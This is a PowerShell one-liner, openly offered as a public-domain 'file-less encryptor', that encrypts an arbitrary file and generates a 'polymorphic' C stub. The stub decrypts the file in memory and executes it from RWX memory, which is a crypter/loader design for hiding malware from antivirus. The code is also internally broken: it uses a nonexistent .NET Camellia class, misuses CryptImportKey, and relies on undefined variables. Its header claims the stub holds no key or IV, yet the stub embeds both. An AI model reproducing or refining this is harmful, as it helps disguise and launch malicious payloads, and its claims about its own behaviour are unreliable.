# RawrZ FilelessEncryptor.ps1 - Public Domain File-less Encryption with Polymorphic Stub
#
# This is free and unencumbered software released into the public domain.
#
# Anyone is free to copy, modify, publish, use, compile, sell, or
# distribute this software, either in source code form or as a compiled
# binary, for any purpose, commercial or non-commercial, and by any
# means.
#
# In jurisdictions that recognize copyright laws, the author or authors
# of this software dedicate any and all copyright interest in the
# software to the public domain. We make this dedication for the benefit
# of the public at large and to the detriment of our heirs and
# successors. We intend this dedication to be an overt act of
# relinquishment in perpetuity of all present and future rights to this
# software under copyright law.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
# OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.
#
# For more information, please refer to <http://unlicense.org/>
#
# Single, 100% file-less PowerShell one-liner that:
# - Accepts a drag-and-drop file (up to ± 1 GB)
# - Encrypts it in memory with OpenSSL Camellia-256-CTR (stream, so RAM usage stays low)
# - Never writes the key/IV to disk – they are only echoed once to the console for you to copy
# - Emits a brand-new polymorphic stub (tiny C source) to the console – you compile it on the spot
# - Every run produces different code (random variable names, different win-api path, different pragma blocks, etc.)
# - The stub itself carries only the encrypted blob (base-64 string inside the .c file) – no separate file, no key, no IV

powershell -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; Add-Type -AssemblyName System.IO; $path=(Read-Host 'Drop file').Trim('\"'); $enc=[System.IO.File]::ReadAllBytes($path); $k=New-Object byte[] 32; $iv=New-Object byte[] 16; (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($k); (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv); $mem=New-Object System.IO.MemoryStream; $alg=[System.Security.Cryptography.Camellia]::Create(); $alg.Key=$k; $alg.IV=$iv; $alg.Mode='CTR'; $cs=New-Object System.Security.Cryptography.CryptoStream($mem,$alg.CreateEncryptor(),[System.Security.Cryptography.CryptoStreamMode]::Write); $cs.Write($enc,0,$enc.Length); $cs.Close(); $b64=[Convert]::ToBase64String($mem.ToArray()); $stub=@\"#include <windows.h>`n#include <wincrypt.h>`n#pragma comment(lib,\"advapi32.lib\")`n#define B64SZ $($b64.Length)`nstatic unsigned char camellia_key[32]={$($k -join ',')};`nstatic unsigned char camellia_iv [16]={$($iv -join ',')};`nstatic const char blob[B64SZ+1]=\"$b64\";`nstatic void rnd(char*s,int n){for(int i=0;i<n;i++)s[i]='a'+(rand()%26);} `nvoid main(void){char n1[16],n2[16],n3[16];srand((unsigned)time(NULL));rnd(n1,16);rnd(n2,16);rnd(n3,16);DWORD len=0;CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,NULL,&len,NULL,NULL);BYTE*$(n1)=(BYTE*)HeapAlloc(GetProcessHeap(),0,len);CryptStringToBinaryA(blob,0,CRYPT_STRING_BASE64,$(n1),&len,NULL,NULL);HCRYPTPROV$(n2);CryptAcquireContextA(&$(n2),NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT);HCRYPTHASH$(n3)=NULL;CryptImportKey($(n2),camellia_key,32,NULL,0,(HCRYPTKEY*)&$(n3));DWORD md=CRYPT_MODE_CTR;CryptSetKeyParam($(n3),KP_MODE,(BYTE*)&md,0);CryptSetKeyParam($(n3),KP_IV,camellia_iv,0);CryptDecrypt($(n3),$(n3),TRUE,0,$(n1),&len);void*exe=VirtualAlloc(NULL,len,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);memcpy(exe,$(n1),len);((void(*)())exe)();}\"@; Write-Host \"KEY/IV (copy now): $(($k|%{ $_.ToString('X2') }) -join '') / $(($iv|%{ $_.ToString('X2') }) -join '')`n`n=== POLYMORPHIC STUB ===`n$stub"
